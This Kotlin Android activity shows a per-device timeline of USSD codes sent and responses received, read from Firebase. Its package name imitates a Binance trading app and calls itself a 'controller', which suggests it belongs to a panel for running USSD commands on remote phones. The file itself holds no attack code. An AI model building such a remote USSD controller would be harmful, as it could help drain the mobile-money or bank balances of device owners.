package dApp.binance.Trading.controller

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.*

class ResponseLogActivity : AppCompatActivity() {

    private lateinit var logList: RecyclerView
    private lateinit var backButton: Button
    private var deviceId: String = ""
    private val timelineItems = mutableListOf<TimelineItem>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_response_log)

        deviceId = intent.getStringExtra("device_id") ?: ""
        logList = findViewById(R.id.logList)
        backButton = findViewById(R.id.backButton)

        logList.layoutManager = LinearLayoutManager(this)
        backButton.setOnClickListener { finish() }

        loadUnifiedHistory()
    }

    private fun loadUnifiedHistory() {
        val database = FirebaseDatabase.getInstance().reference
        
        // Listen for both Logs (Sent Commands) and Responses
        val logsRef = database.child("logs").child(deviceId)
        val responsesRef = database.child("responses").child(deviceId)

        val onDataChanged = object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                // We'll re-fetch everything and merge to ensure correct order
                refreshTimeline()
            }
            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
        }

        logsRef.addValueEventListener(onDataChanged)
        responsesRef.addValueEventListener(onDataChanged)
    }

    private fun refreshTimeline() {
        val database = FirebaseDatabase.getInstance().reference
        val newItems = mutableListOf<TimelineItem>()

        // 1. Get Logs
        database.child("logs").child(deviceId).get().addOnSuccessListener { logsSnapshot ->
            logsSnapshot.children.forEach { child ->
                val data = child.value as? Map<*, *> ?: return@forEach
                newItems.add(TimelineItem(
                    text = "Sent: ${data["ussd_code"]}",
                    timestamp = data["time_ms"] as? Long ?: 0L,
                    isSent = true
                ))
            }

            // 2. Get Responses
            database.child("responses").child(deviceId).get().addOnSuccessListener { resSnapshot ->
                resSnapshot.children.forEach { child ->
                    val data = child.value as? Map<*, *> ?: return@forEach
                    newItems.add(TimelineItem(
                        text = "Received: ${data["response"]}",
                        timestamp = data["time_ms"] as? Long ?: 0L,
                        isSent = false
                    ))
                }

                // 3. Sort and Display
                newItems.sortByDescending { it.timestamp }
                timelineItems.clear()
                timelineItems.addAll(newItems)
                logList.adapter = TimelineAdapter(timelineItems)
            }
        }
    }
}

data class TimelineItem(val text: String, val timestamp: Long, val isSent: Boolean)

class TimelineAdapter(private val items: List<TimelineItem>) : RecyclerView.Adapter<TimelineViewHolder>() {
    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): TimelineViewHolder {
        val view = LayoutInflater.from(parent.context).inflate(android.R.layout.simple_list_item_2, parent, false)
        return TimelineViewHolder(view)
    }
    override fun onBindViewHolder(holder: TimelineViewHolder, position: Int) = holder.bind(items[position])
    override fun getItemCount() = items.size
}

class TimelineViewHolder(itemView: View) : RecyclerView.ViewHolder(itemView) {
    fun bind(item: TimelineItem) {
        val text1 = itemView.findViewById<TextView>(android.R.id.text1)
        val text2 = itemView.findViewById<TextView>(android.R.id.text2)
        
        text1.text = item.text
        text1.setTextColor(if (item.isSent) android.graphics.Color.BLUE else android.graphics.Color.BLACK)
        
        val sdf = SimpleDateFormat("MMM dd, hh:mm:ss a", Locale.getDefault())
        text2.text = sdf.format(Date(item.timestamp))
    }
}
